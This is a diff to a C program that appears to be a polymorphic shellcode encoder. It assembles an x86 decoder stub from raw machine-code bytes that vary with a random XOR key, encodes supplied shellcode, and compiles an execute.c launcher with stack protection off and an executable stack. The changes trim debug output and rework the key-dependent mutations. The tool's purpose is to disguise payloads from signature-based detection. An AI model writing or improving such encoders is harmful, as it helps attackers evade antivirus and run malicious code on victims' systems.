@@ -83,7 +83,6 @@ char* appendString(char str1[], char str2[]) {
 }
 
 char* polymorphicDecoder(char key, int codeLength) {
-	printf("     Initialising decoder stub..\n");
 	char decoderParts[19][10] = 
 	{
 		"\xeb\x1e",
@@ -107,13 +106,9 @@ char* polymorphicDecoder(char key, int codeLength) {
 		"\xe8\xdc\xff\xff\xff"
 	};
 
-	printf("     Setting key..\n");
 	decoderParts[4][1] = key;
-
-	printf("     Setting code length..\n");
 	decoderParts[6][1] = (unsigned char)(codeLength - 1);
 
-	printf("     Creating polymorphic version..\n");
 	if (0b00000001 & key) {
 		strcpy(decoderParts[3], "\x6a\xaa");
 		strcpy(decoderParts[4], "\x58");
@@ -121,51 +116,56 @@ char* polymorphicDecoder(char key, int codeLength) {
 
 		decoderParts[0][1] -= 1;
 		decoderParts[18][1] += 1;
-	} else if (0b00000010 & key) {
+	}
+	if (0b00000010 & key) {
 		strcpy(decoderParts[5], "\x6a\xaa");
 		strcpy(decoderParts[6], "\x59");
 		decoderParts[5][1] = (unsigned char)(codeLength - 1);
 
 		decoderParts[0][1] -= 1;
 		decoderParts[18][1] += 1;
-	} else if (0b00000100 & key) {
+	}
+	if (0b00000100 & key) {
 		strcpy(decoderParts[7], "\x8a\x16");
 		strcpy(decoderParts[10], "\x88\xd3");
 		strcpy(decoderParts[12], "\x8a\x16");
 		strcpy(decoderParts[13], "\x30\x1e");
-	} else if (0b00001000 & key) {
+	}
+	if (0b00001000 & key) {
 		strcpy(decoderParts[8], "\x30\x06");
 		decoderParts[9][0] = '\0';
 
 		decoderParts[0][1] -= 2;
 		decoderParts[18][1] += 2;
-	} else if (0b00010000 & key) {
+	}
+	if (0b00010000 & key) {
 		strcpy(decoderParts[11], "\x46");
 
 		decoderParts[0][1] -= 2;
 		decoderParts[18][1] += 2;
 		decoderParts[15][1] += 2;
-	} else if (0b00100000 & key) {
-		strcpy(decoderParts, "\x2e\xf7");
+	}
+	if (0b00100000 & key) {
+		strcpy(decoderParts[14], "\x2e\xf7");
 		decoderParts[14][1] = decoderParts[15][1];
 		decoderParts[15][0] = '\0';
 
 		decoderParts[0][1] -= 2;
 		decoderParts[18][1] += 2;
-	} else if (0b01000000 & key) {
+	}
+	if (0b01000000 & key) {
 		decoderParts[1][0] = '\0';
 
 		decoderParts[0][1] -= 1;
 		decoderParts[18][1] += 1;
-	} else if (0b10000000 & key) {
+	}
+	if (0b10000000 & key) {
 		strcpy(decoderParts[16], "\xeb\x05");
 		decoderParts[17][0] = '\0';
 
 		decoderParts[0][1] -= 1;
 		decoderParts[18][1] += 1;
 	}
-
-	printf("     Forming string..\n");
 
 	static char stub[50];
 	sprintf(stub, "%s%s%s%s%s"\
@@ -191,8 +191,6 @@ char* polymorphicDecoder(char key, int codeLength) {
                 decoderParts[16],
                 decoderParts[17],
                 decoderParts[18]);
-        
-	printf("     Done!\n");
         
 	return stub;
 }
@@ -228,7 +226,6 @@ int main(int argc, char *argv[]) {
 		// Import the shellcode
         	printf("[*] Importing shellcode..\n");
         	const char *shellcode_string = argv[1];
-        	printf("     Converting hex-string to byte-array..\n");
 	        hex2bin(shellcode_string, shellcode);
 	}
 
@@ -236,7 +233,6 @@ int main(int argc, char *argv[]) {
 	char *encodedShellcode;
 
 	// Seed random number generator with the current time
-	printf("[*] Seeding random number generator..\n");
 	srand(time(NULL));
 
 	// Encode shellcode with new keys until no the
@@ -246,7 +242,7 @@ int main(int argc, char *argv[]) {
 	do {
 		// Get random key
 		key = createKey();
-		printf("     Key = 0x%02x\n", (0xFF & key));
+		printf("    With key: 0x%02x\n", (0xFF & key));
 
 		// Encode shellcode
 		encodedShellcode = encode(shellcode, key);
@@ -277,7 +273,7 @@ int main(int argc, char *argv[]) {
 		encodedShellcode_string[4*i + 3] = byte2char(encodedShellcode[i] & 0x0f);
         }
 
-	printf("[*] Encoded shellcode:\n     %s%s\n", decoderStub_string, encodedShellcode_string);
+	printf("[*] Encoded shellcode:\n%s%s\n", decoderStub_string, encodedShellcode_string);
 	printf("[*] Creating ./execute.c..\n");
 
 	FILE *fp = fopen("./execute.c", "wab");
@@ -308,7 +304,7 @@ int main(int argc, char *argv[]) {
 	}
 
 	printf("[*] Compiling ./execute.c!\n");
-	printf("     Output file: ./execute\n");
+	printf("    Output:   ./execute\n");
 
 	system("gcc -fno-stack-protector -z execstack -o execute execute.c\n");
 
